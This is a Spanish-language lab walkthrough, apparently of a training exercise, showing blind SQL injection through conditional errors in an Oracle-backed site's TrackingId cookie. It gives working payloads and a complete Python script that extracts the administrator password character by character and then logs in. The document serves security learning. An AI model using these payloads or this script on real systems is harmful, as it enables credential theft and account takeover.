![[Pasted image 20250724120723.png]]

Vamos a analizar la consulta con BurpSuite, para poder modificar el campo inyectable:

![[Pasted image 20250724121209.png]]
![[Pasted image 20250724121303.png]]

Vamos a colocar una comilla en el campo `TrackingId`, para ver como reacciona la web.

![[Pasted image 20250724121422.png]]
![[Pasted image 20250724121454.png]]

Al colocar la comilla en ese campo, el servidor lanza un código de estado 500, ya que la consulta es erronea. Podemos aprovecharnos de ello para poder determinar si la consulta es verdadera, según el código de estado de la web 200/500. Vamos a realizar una consulta verdadera para ver si la web devuelve un código de estado 200.

![[Pasted image 20250724122548.png]]
![[Pasted image 20250724121948.png]]

En este caso, la BBDD que funciona por detrás es `Oracle`, ya que si concatenamos una consulta de la siguiente manera `'||(select '' from dual)-- -`, nos devuelve `200 OK`.

![[Pasted image 20250724123517.png]]
![[Pasted image 20250724123539.png]]

### Conocer la existencia de la tabla users
****
Teniendo en cuenta esto, podríamos tomar la primera fila de una tabla, en este caso `users`, para ver si esta existe en caso de que la web devuelva un `200 OK`. Para ello haremos uso de la siguiente consulta `' ||(SELECT '' FROM users WHERE rownum=1)-- -`

![[Pasted image 20250725195723.png]]
![[Pasted image 20250725195811.png]]

### Conocer la existencia del usuario administrador
****
Una vez sabemos que la tabla `users` existe. Debemos saber si el usuario `administrator` es válido. Para ello, el cheatsheet, nos recomienda hacerlo de la siguiente forma para una base de datos `Oracle`.
## Conditional errors
You can test a single boolean condition and trigger a database error if the condition is true.

|            |                                                                                         |
| ---------- | --------------------------------------------------------------------------------------- |
| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`      |
| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`                         |
| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`          |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |
Consulta para conocer la existencia de un usuario conditional error Oracle: `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')-- -`

Esta consulta funciona de la siguiente manera:
Si el usuario `administrator` existe, la web mostrará un código de estado `500 Internal Server Error`, ya que la ejecución de `TO_CHAR(1/0)` da un error (no se puede dividir un numero entre cero). Y en caso de que el usuario `administrator` no exista, la web devuelve un código de estado `200 OK`.

![[Pasted image 20250725210907.png]]
![[Pasted image 20250725210933.png]]
El usuario `administrator` existe.
### Conocer la longitud de la contraseña de administrator
****
Teniendo en cuenta la consulta anterior, intentaremos hallar la longitud de la contraseña del usuario administrador.

Consulta para conocer la longitud de la contraseña de un usuario conditional error Oracle: `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator' AND LENGTH(password) > 19)-- -`

Esta consulta nos permite a través de un condicional, determinar si la contraseña del usuario `administrator` (usuario existente) es de una longitud mayor a 19 caracteres, en caso de que sea verdadero (la contraseña tiene más de 19 caracteres), veremos un error `500 Internal Server Error` en la web; en caso de que sea falso, veremos un código `200 OK` en la web.

![[Pasted image 20250725205223.png]]
![[Pasted image 20250725203127.png]]

Vemos un error `500` en la web, por lo tanto sabemos que la contraseña del usuario `administrator` tiene más de 19 caracteres. Vamos a probar si la contraseña tiene una longitud mayor a 20 caracteres.

![[Pasted image 20250725205324.png]]
![[Pasted image 20250725205354.png]]

Vemos que la web nos responde con un `200 OK`, por lo tanto, la consulta `LENGTH(password) > 20` es falsa. Por lo tanto, si la contraseña tiene una longitud mayor a 19, pero no mayor a 20, la `password` del usuario `administrator` tiene una longitud igual a 20.

### Fuzzear los caracteres de la contraseña
****
Una vez conociendo que la longitud de la contraseña del usuario `administrator` es 20. Con la misma base que utilizamos para averiguar la longitud, averiguaremos cada uno de los caracteres de la contraseña.

Consulta para fuzzear los caracteres de un usuario conditional error Oracle: `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator' AND SUBSTR(password,1,1)='a')-- -`

Esta consulta nos permite a través de un condicional, determinar si el primer caracter de la contraseña del usuario `administrator` (usuario existente) es una "a", en caso de que sea verdadero (el primer caracter de la contraseña es una "a"), veremos un error `500 Internal Server Error` en la web; en caso de que sea falso, veremos un código `200 OK`. Esto nos va a permitir probar caracter por caracter, hasta armar la contraseña completa. Para ello haremos un script con python que llamaremos `sqli_conditional_response.py`.
## Código del Script

```python
#!/usr/bin/env python3
from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

#ctrl + C
signal.signal(signal.SIGINT, def_handler)

page_url = input("Ingrese la url: ")
caracteres = str(string.digits + string.ascii_lowercase + string.ascii_uppercase) #todos los caracteres
cookie = input("Ingrese la cookie: ")
sessionHash = input("Ingrese el hash de session: ")

def makeRequest():
    password = ''

    p1 = log.progress("")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    progressPass = log.progress('Password')

    for posicion in range(1,21): #1..20
        for caracter in caracteres:
            cookies = {
                'TrackingId': "%s'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator' AND SUBSTR(password,%d,1)='%s')-- -" % (cookie,posicion,caracter),
                'session': sessionHash
            }

            r=requests.get(url=page_url, cookies=cookies)

            if r.status_code == 500: # Código de estado 500, caracter correcto
                password += caracter
                progressPass.status(password)
                break


if __name__ == '__main__':
    makeRequest()
```

## Análisis del Código

### Payload SQL utilizado

```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator' AND SUBSTR(password,POSICION,1)='CARACTER')-- -
```

### Desglose del payload

#### 1. **Operador de concatenación `||`**

```sql
'||
```

- En Oracle, `||` es el operador de concatenación
- Conecta la cookie original con nuestra inyección SQL

#### 2. **Estructura CASE WHEN**

```sql
(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END ...)
```

- **CASE WHEN**: Estructura condicional tipo if-else
- **Condición real**: En lugar de `(1=1)`, la condición real es la verificación del caracter
- **THEN TO_CHAR(1/0)**: Si es TRUE → genera error de división por cero
- **ELSE NULL**: Si es FALSE → retorna NULL sin error

#### 3. **Condición combinada**

```sql
FROM users WHERE username='administrator' AND SUBSTR(password,POSICION,1)='CARACTER'
```

- Busca en la tabla `users`
- Usuario específico: `administrator`
- **SUBSTR(password,POSICION,1)**: Extrae 1 caracter en la posición especificada
- Compara si ese caracter es igual al que estamos probando

### Funcionamiento de la detección de errores

#### Escenario 1: Caracter correcto

```python
if r.status_code == 500: # Código de estado 500, caracter correcto
    password += caracter
    progressPass.status(password)
    break
```

**¿Qué pasa internamente?**

1. `SUBSTR(password,1,1)='a'` es **TRUE** (asumiendo que 'a' es correcto)
2. La subconsulta encuentra una fila que cumple ambas condiciones
3. Se ejecuta `TO_CHAR(1/0)` → **División por cero**
4. Oracle genera un error interno
5. El servidor web retorna **HTTP 500** (Internal Server Error)
6. El script detecta el error y confirma que el caracter es correcto

#### Escenario 2: Caracter incorrecto

1. `SUBSTR(password,1,1)='z'` es **FALSE** (asumiendo que 'z' es incorrecto)
2. La subconsulta NO encuentra filas que cumplan ambas condiciones
3. Se ejecuta `NULL`
4. **No hay error**
5. El servidor retorna **HTTP 200** (OK)
6. El script continúa probando el siguiente caracter

![[Pasted image 20250725220707.png]]

### Nos logueamos como el usuario administrator
****
![[Pasted image 20250725220825.png]]
![[Pasted image 20250725220838.png]]